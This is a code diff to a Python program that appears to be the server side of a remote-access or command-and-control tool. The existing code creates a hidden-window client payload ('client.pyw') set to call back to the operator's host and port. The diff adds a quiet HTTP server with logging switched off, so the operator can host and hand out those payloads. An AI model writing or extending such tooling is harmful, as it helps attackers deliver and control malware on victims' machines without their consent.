@@ -4,8 +4,11 @@ import os
 import json
 import base64
 import socket
+import http.server
+import socketserver
 from colorama import Fore
 from utils.config import *
+from threading import Thread
 from utils.discordRPC import *
 from utils.UpdateChecker import *
 
@@ -34,6 +37,9 @@ version = open("./version.txt").read()
 
 host = config.get("host")
 port = config.get("port")
+
+fileHosting = config.get("enableFileHosting")
+fileHostingPort = config.get("fileHostingPort")
 
 # ============================================================================================================================ #
 
@@ -222,6 +228,22 @@ class Server:
 
 # ============================================================================================================================ #
 
+class quiet_server(http.server.SimpleHTTPRequestHandler):
+
+    def log_message(self, format: str, *args: any) -> None:
+        pass
+
+class Helper():
+        
+    def host_files():
+        handler = quiet_server    
+        with socketserver.TCPServer((host, fileHostingPort), handler) as httpd:
+            print(f"{Fore.LIGHTBLACK_EX}[{Fore.LIGHTGREEN_EX}SUCCESS{Fore.LIGHTBLACK_EX}]{Fore.LIGHTGREEN_EX} Youre files are hosted on: http://{host}:{fileHostingPort}")
+            print(f"{Fore.LIGHTBLACK_EX}[{Fore.LIGHTGREEN_EX}SUCCESS{Fore.LIGHTBLACK_EX}]{Fore.LIGHTGREEN_EX} Find you're payloads on: http://{host}:{fileHostingPort}/out")
+            httpd.serve_forever()
+
+# ============================================================================================================================ #
+
 class Application():
 
     def printHelp(self):
@@ -251,8 +273,8 @@ class Application():
         with open("./resources/client.txt", 'r') as first_file, open('./out/client.pyw', 'a') as second_file:
             for line in first_file:
                 second_file.write(line.replace("ENTER HOST", host).replace("'ENTER PORT'", f"{port}"))
-
         print(f"{Fore.LIGHTGREEN_EX}[+] Successfully created payload in './out/client.pyw'")
+
 
 # ============================================================================================================================ #
 
@@ -279,6 +301,7 @@ class Application():
 
                 elif command[0] == "exit":
                     exit(-1)
+                    break
             except Exception:
                 print("[-] Error running command, check the syntax of the command.")
 
@@ -290,6 +313,10 @@ def main():
 
     if(config.get("check_for_update")):
         check_for_update(version=version)
+
+    if fileHosting:
+        t = Thread(target=Helper.host_files)
+        t.start()
 
     # Start the application
     application = Application()
@@ -309,3 +336,8 @@ def main():
 
 
 main()
+# handler = http.server.SimpleHTTPRequestHandler
+
+# with socketserver.TCPServer(("", fileHostingPort), handler) as httpd:
+#     print(f"{theme_color}You can find your output file on: {host}:{fileHostingPort}/out/client.pyw")
+#     httpd.serve_forever()
